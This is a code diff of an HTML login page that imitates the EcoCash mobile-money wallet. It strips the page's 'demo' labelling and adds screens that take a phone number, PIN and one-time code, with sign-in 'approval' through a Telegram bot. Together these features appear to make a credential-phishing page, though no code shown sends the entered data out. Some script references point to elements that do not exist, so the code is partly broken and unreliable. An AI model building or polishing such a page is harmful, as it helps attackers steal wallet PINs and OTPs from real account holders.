@@ -4,21 +4,27 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <meta name="theme-color" content="#0875d1">
-<title>Wallet Demo</title>
-
+<title>Wallet Login</title>
 <style>
-* { box-sizing: border-box; }
+* {
+  box-sizing: border-box;
+}
 
-[hidden] { display: none !important; }
+[hidden] {
+  display: none !important;
+}
 
-html, body {
+html,
+body {
   margin: 0;
   width: 100%;
   height: 100%;
   font-family: Arial, sans-serif;
 }
 
-body { background: #0875d1; }
+body {
+  background: #0875d1;
+}
 
 .app {
   display: flex;
@@ -49,13 +55,8 @@ body { background: #0875d1; }
   color: #1769b4;
 }
 
-.logo span { color: #d23d43; }
-
-.demo-label {
-  font-size: 10px;
-  color: #8a5555;
-  margin: -28px 0 20px;
-  font-weight: bold;
+.logo span {
+  color: #d23d43;
 }
 
 h1 {
@@ -63,11 +64,19 @@ h1 {
   margin: 0 0 20px;
 }
 
-.step { animation: rise 0.35s ease both; }
+.step {
+  animation: rise 0.35s ease both;
+}
 
 @keyframes rise {
-  from { opacity: 0; transform: translateY(8px); }
-  to { opacity: 1; transform: none; }
+  from {
+    opacity: 0;
+    transform: translateY(8px);
+  }
+  to {
+    opacity: 1;
+    transform: none;
+  }
 }
 
 .phone {
@@ -79,11 +88,12 @@ h1 {
   gap: 9px;
   padding: 0 9px;
   text-align: left;
+  transition: border-color 0.15s ease, box-shadow 0.15s ease;
 }
 
 .phone:focus-within {
   border-color: #0875d1;
-  box-shadow: 0 0 0 3px rgba(8,117,209,.18);
+  box-shadow: 0 0 0 3px rgba(8, 117, 209, 0.18);
 }
 
 .dial {
@@ -121,12 +131,13 @@ h1 {
   font-size: 22px;
   color: #1769b4;
   background: white;
+  transition: border-color 0.15s ease, box-shadow 0.15s ease;
 }
 
 .pin input:focus {
   outline: none;
   border-color: #0875d1;
-  box-shadow: 0 0 0 3px rgba(8,117,209,.18);
+  box-shadow: 0 0 0 3px rgba(8, 117, 209, 0.18);
 }
 
 .subtle {
@@ -135,6 +146,26 @@ h1 {
   font-size: 13px;
   line-height: 1.5;
   color: #626c74;
+}
+
+.subtle strong {
+  color: #1769b4;
+}
+
+.spinner {
+  width: 44px;
+  height: 44px;
+  margin: 8px auto 18px;
+  border: 4px solid #d6e6f5;
+  border-top-color: #0875d1;
+  border-radius: 50%;
+  animation: spin 0.9s linear infinite;
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
 }
 
 .otp-row {
@@ -157,11 +188,12 @@ h1 {
   color: #1769b4;
   font-size: 22px;
   font-weight: 600;
+  transition: border-color 0.15s ease, box-shadow 0.15s ease;
 }
 
 .otp-box.active {
   border-color: #0875d1;
-  box-shadow: 0 0 0 3px rgba(8,117,209,.18);
+  box-shadow: 0 0 0 3px rgba(8, 117, 209, 0.18);
 }
 
 .otp-input {
@@ -190,6 +222,44 @@ h1 {
   margin: 0 auto 18px;
 }
 
+.btn-primary {
+  display: block;
+  width: 100%;
+  height: 52px;
+  margin: 0 0 12px;
+  border: 0;
+  border-radius: 9px;
+  background: #0a4f8f;
+  color: #fff;
+  font: 600 14px Arial, sans-serif;
+  cursor: pointer;
+  transition: background-color 0.2s ease, opacity 0.2s ease, transform 0.1s ease;
+}
+
+.btn-primary:hover:not(:disabled) {
+  background: #083f73;
+}
+
+.btn-primary:active:not(:disabled) {
+  transform: scale(0.98);
+}
+
+.btn-primary:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+
+.link {
+  padding: 8px;
+  border: 0;
+  background: none;
+  color: #fff;
+  font: inherit;
+  font-size: 13px;
+  text-decoration: underline;
+  cursor: pointer;
+}
+
 .actions {
   display: flex;
   gap: 10px;
@@ -204,6 +274,15 @@ h1 {
   color: #0871c9;
   font-size: 12px;
   cursor: pointer;
+  transition: transform 0.1s ease, box-shadow 0.2s ease;
+}
+
+.actions button:hover {
+  box-shadow: 0 4px 14px rgba(0, 40, 90, 0.25);
+}
+
+.actions button:active {
+  transform: scale(0.98);
 }
 
 .symbol {
@@ -229,17 +308,16 @@ h1 {
   text-decoration: underline;
 }
 
+button:focus-visible,
+a:focus-visible {
+  outline: 2px solid #fff;
+  outline-offset: 2px;
+}
+
 #notice {
   font-size: 12px;
   min-height: 16px;
   margin: 8px 0 0;
-}
-
-.congrats {
-  font-size: 27px;
-  font-weight: bold;
-  color: #1769b4;
-  margin: 20px 0;
 }
 
 @media (max-height: 650px) {
@@ -247,192 +325,301 @@ h1 {
     height: 62%;
     padding-top: 20px;
   }
-  .logo { margin-bottom: 16px; }
-  h1 { margin-bottom: 12px; }
-  .hint { margin: 7px 0 12px; }
-  .version { margin-top: 14px; }
-  .prompt { margin-bottom: 10px; }
+
+  .logo {
+    margin-bottom: 16px;
+  }
+
+  h1 {
+    margin-bottom: 12px;
+  }
+
+  .hint {
+    margin: 7px 0 12px;
+  }
+
+  .version {
+    margin-top: 14px;
+  }
+
+  .prompt {
+    margin-bottom: 10px;
+  }
 }
 </style>
 </head>
-
 <body>
 <div class="app">
+  <section class="top">
+    <div class="logo">Eco<span>Cash</span></div>
 
-<section class="top">
+    <div class="step" data-step="login">
+      <h1>Login</h1>
+      <div class="phone">
+        <span>🇿🇼</span>
+        <span class="dial">+263</span>
+        <input id="phone" type="tel" inputmode="numeric" autocomplete="tel-national"
+          placeholder="Phone Number" aria-label="Phone number">
+      </div>
 
-  <div class="logo">Eco<span>Cash</span></div>
-
-  <!-- FIRST SCREEN -->
-  <div class="step" data-step="login">
-
-    <h1>Login</h1>
-
-    <div class="phone">
-      <span>🇿🇼</span>
-      <span class="dial">+263</span>
-      <input id="phone" type="tel" inputmode="numeric"
+      <p class="hint">Enter your PIN</p>
+      <div class="pin">
+        <input aria-label="PIN digit 1" type="password" inputmode="numeric" maxlength="1" autocomplete="off">
+        <input aria-label="PIN digit 2" type="password" inputmode="numeric" maxlength="1" autocomplete="off">
+        <input aria-label="PIN digit 3" type="password" inputmode="numeric" maxlength="1" autocomplete="off">
+        <input aria-label="PIN digit 4" type="password" inputmode="numeric" maxlength="1" autocomplete="off">
+      </div>
     </div>
 
-    
-    <p class="hint">Enter your pin
-    <div class="pin" id="pinBoxes">
-      <input type="password" inputmode="numeric"
-      <input type="password" inputmode="numeric" 
-      <input type="password" inputmode="numeric"
-      <input type="password" inputmode="numeric" 
-
-  </div>
-
-  <!-- SIX-DIGIT SCREEN -->
-  <div class="step" data-step="otp" hidden>
-
-    <h1>Enter otp</h1>
-
-   
-
-    <div class="otp-row">
-      <div class="otp-box"></div>
-      <div class="otp-box"></div>
-      <div class="otp-box"></div>
-      <div class="otp-box"></div>
-      <div class="otp-box"></div>
-      <div class="otp-box"></div>
-
-      <input id="otp-input" class="otp-input"
-        type="text" inputmode="numeric" maxlength="6"
-        autocomplete="on" 
+    <div class="step" data-step="signing" hidden>
+      <div class="spinner" aria-hidden="true"></div>
+      <h1>Signing you in...</h1>
+      <p class="subtle">Checking your phone number and PIN</p>
     </div>
 
-
-  </div>
-
-  <!-- FINAL SCREEN -->
-  <div class="step" data-step="done" hidden>
-    <div class="congrats">Congratulations! 🎉</div>
-    <p class="subtle">
-      You have successfully completed the aplication.
-    </p>
-  </div>
-
-</section>
-
-<section class="bottom">
-
-  <div class="step" data-step="login">
-    <p class="prompt">To register for a wallet or get assistance, click below</p>
-
-    <div class="actions">
-      <button type="button" id="register">
-        <span class="symbol">♟</span>Register
-      </button>
-
-      <button type="button" id="help">
-        <span class="symbol">ⓘ</span>Help &amp; Support
-      </button>
+    <div class="step" data-step="approval" hidden>
+      <div class="spinner" aria-hidden="true"></div>
+      <h1>Waiting for approval</h1>
+      <p class="subtle">
+        Approve this sign-in for <strong id="approval-telegram bot"></strong> in the EcoCash Telegram bot.
+      </p>
     </div>
 
-    <p class="version">v4.0.5p</p>
+    <div class="step" data-step="otp" hidden>
+      <h1>Enter OTP</h1>
+      <p class="subtle">
+        Enter the 6-digit code sent to <strong id="otp-phone"></strong>
+      </p>
+      <div class="otp-row">
+        <div class="otp-box" aria-hidden="true"></div>
+        <div class="otp-box" aria-hidden="true"></div>
+        <div class="otp-box" aria-hidden="true"></div>
+        <div class="otp-box" aria-hidden="true"></div>
+        <div class="otp-box" aria-hidden="true"></div>
+        <div class="otp-box" aria-hidden="true"></div>
+        <input id="otp-input" class="otp-input" type="text" inputmode="numeric"
+          autocomplete="one-time-code" maxlength="6" aria-label="One-time code">
+      </div>
+    </div>
+  </section>
 
-    <p class="terms">
-      By continuing, you agree to the
-      <a href="#" id="terms">Terms and Conditions</a>
-    </p>
-  </div>
+  <section class="bottom">
+    <div class="step" data-step="login">
+      <p class="prompt">To register for a wallet or get assistance, click below</p>
+      <button type="button" class="btn-primary" id="login-button">Log in</button>
+      <div class="actions">
+        <button type="button" id="register">
+          <span class="symbol">♟</span>Register
+        </button>
+        <button type="button" id="help">
+          <span class="symbol">ⓘ</span>Help &amp; Support
+        </button>
+      </div>
+      <p class="version">Eco Cash</p>
+      <p class="terms">
+        By continuing, you agree to the
+        <a href="#" id="terms">Terms and Conditions</a>
+      </p>
+    </div>
 
-  <div class="step" data-step="otp" hidden>
+    <div class="step" data-step="signing" hidden>
+      <p class="prompt">This usually takes a few seconds.</p>
+    </div>
 
-  </div>
+      <div class="step" data-step="approval" hidden>
+      <p class="prompt">
+        Signing in...
+      </p>
+    </div>
 
-  <p id="notice" role="status"></p>
+    <div class="step" data-step="otp" hidden>
+      <p class="prompt">Didn't get the code? You can request a new one shortly.</p>
+      <button type="button" class="btn-primary" id="resend" disabled>Resend code in 30s</button>
+      <button type="button" class="link" id="change-number">Change number</button>
+    </div>
 
-</section>
+    <p id="notice" role="status"></p>
+  </section>
 </div>
 
 <script>
-const $ = selector => document.querySelector(selector);
+const $ = (selector) => document.querySelector(selector);
 
-const pinInputs = [...document.querySelectorAll('#pinBoxes input')];
+const phoneInput = $('#phone');
+const pinInputs = [...document.querySelectorAll('.pin input')];
+const notice = $('#notice');
 const otpInput = $('#otp-input');
 const otpBoxes = [...document.querySelectorAll('.otp-box')];
-const notice = $('#notice');
+const resendButton = $('#resend');
+const RESEND_SECONDS = 30;
+
+let phoneNumber = '';
+let approvalResolve = null;
+let resendInterval = null;
+let otpAbort = null;
+
+function digitsOnly(value, maxLength) {
+  return value.replace(/\D/g, '').slice(0, maxLength);
+}
 
 function showStep(name) {
-  document.querySelectorAll('[data-step]').forEach(element => {
+  document.querySelectorAll('[data-step]').forEach((element) => {
     element.hidden = element.dataset.step !== name;
   });
   notice.textContent = '';
 }
 
-function cleanDigits(value, max) {
-  return value.replace(/\D/g, '').slice(0, max);
-}
-
-// Four-digit pin input
 pinInputs.forEach((input, index) => {
   input.addEventListener('input', () => {
-    input.value = cleanDigits(input.value, 1);
-
+    input.value = digitsOnly(input.value, 1);
     if (input.value && pinInputs[index + 1]) {
       pinInputs[index + 1].focus();
     }
-
-    if (pinInputs.every(box => box.value.length === 1)) {
-      setTimeout(() => {
-        pinInputs.forEach(box => box.value = '');
-        showStep('otp');
-        otpInput.focus();
-      }, 250);
-    }
   });
 
-  input.addEventListener('keydown', event => {
+  input.addEventListener('keydown', (event) => {
     if (event.key === 'Backspace' && !input.value && pinInputs[index - 1]) {
       pinInputs[index - 1].focus();
     }
   });
 });
 
-$('#pinBoxes').addEventListener('click', () => {
-  pinInputs[0].focus();
-});
+function isLoginReady() {
+  return (
+    /^\d{9,15}$/.test(digitsOnly(phoneInput.value, 20)) &&
+    pinInputs.every((input) => input.value.length === 1)
+  );
+}
 
-// Six-digit otp input
-otpInput.addEventListener('input', () => {
-  otpInput.value = cleanDigits(otpInput.value, 6);
-
-  const digits = otpInput.value;
-
-  otpBoxes.forEach((box, index) => {
-    box.textContent = digits[index] ? '•' : '';
-    box.classList.toggle(
-      'active',
-      index === Math.min(digits.length, 5)
-    );
-  });
-
-  if (digits.length === 6) {
-    otpInput.value = '';
-
-    setTimeout(() => {
-      showStep('done');
-    }, 250);
+$('#login-button').onclick = () => {
+  if (!isLoginReady()) {
+    notice.textContent = 'Enter your phone number and 4-digit PIN to continue.';
+    return;
   }
-});
+  phoneNumber = digitsOnly(phoneInput.value, 20);
+  showStep('signing');
+  window.setTimeout(showApproval, 1500);
+};
 
-$('#register').addEventListener('click', () => {
+function showApproval() {
+  $('#approval-phone').textContent = '+263 ' + phoneNumber;
+  showStep('approval');
+  waitForTelegramApproval().then(showOtp);
+}
 
-});
+function waitForTelegramApproval() {
+  // Demo stand-in: resolves when the approve button is tapped. Replace with a check of the Telegram bot's approval status.
+  return new Promise((resolve) => {
+    approvalResolve = resolve;
+  });
+}
 
-$('#help').addEventListener('click', () => {
- 
-});
+$('#approve-demo').onclick = () => {
+  if (approvalResolve) {
+    approvalResolve();
+    approvalResolve = null;
+  }
+};
 
-$('#terms').addEventListener('click', event => {
+$('#cancel-approval').onclick = () => {
+  approvalResolve = null;
+  showStep('login');
+};
+
+function showOtp() {
+  $('#otp-phone').textContent = '+263 ' + phoneNumber;
+  setOtpValue('');
+  showStep('otp');
+  otpInput.focus();
+  startResendCountdown();
+  listenForSmsCode();
+}
+
+function setOtpValue(value) {
+  otpInput.value = digitsOnly(value, 6);
+  renderOtpBoxes();
+  notice.textContent =
+    otpInput.value.length === 6 ? 'Code received. Connect your verification service to continue.' : '';
+}
+
+function renderOtpBoxes() {
+  const value = otpInput.value;
+  const activeIndex = Math.min(value.length, otpBoxes.length - 1);
+  otpBoxes.forEach((box, index) => {
+    box.textContent = value[index] ?? '';
+    box.classList.toggle('active', index === activeIndex);
+  });
+}
+
+otpInput.addEventListener('input', () => setOtpValue(otpInput.value));
+
+function listenForSmsCode() {
+  stopSmsListener();
+  if (!('OTPCredential' in window)) return;
+  otpAbort = new AbortController();
+  navigator.credentials
+    .get({ otp: { transport: ['sms'] }, signal: otpAbort.signal })
+    .then((credential) => {
+      if (credential && credential.code) setOtpValue(credential.code);
+    })
+    .catch(() => {
+      // SMS autofill is optional; typing the code still works.
+    });
+}
+
+function stopSmsListener() {
+  if (otpAbort) {
+    otpAbort.abort();
+    otpAbort = null;
+  }
+}
+
+function startResendCountdown() {
+  stopResendCountdown();
+  let remaining = RESEND_SECONDS;
+  resendButton.disabled = true;
+  resendButton.textContent = 'Resend code in ' + remaining + 's';
+  resendInterval = window.setInterval(() => {
+    remaining -= 1;
+    if (remaining > 0) {
+      resendButton.textContent = 'Resend code in ' + remaining + 's';
+      return;
+    }
+    stopResendCountdown();
+    resendButton.disabled = false;
+    resendButton.textContent = 'Resend code';
+  }, 1000);
+}
+
+function stopResendCountdown() {
+  window.clearInterval(resendInterval);
+  resendInterval = null;
+}
+
+resendButton.onclick = () => {
+  setOtpValue('');
+  startResendCountdown();
+  notice.textContent = 'Connect your SMS provider to send a new code.';
+};
+
+$('#change-number').onclick = () => {
+  stopResendCountdown();
+  stopSmsListener();
+  showStep('login');
+};
+
+$('#register').onclick = () => {
+  notice.textContent = 'Install the Ecocash super app on the Play Store and register, then come back and continue with the process.';
+};
+
+$('#help').onclick = () => {
+  notice.textContent = "Use your provider's official support channel.";
+};
+
+$('#terms').onclick = (event) => {
   event.preventDefault();
- 
-});
+  notice.textContent = "Add your service's terms URL here.";
+};
 </script>
-
 </body>
 </html>
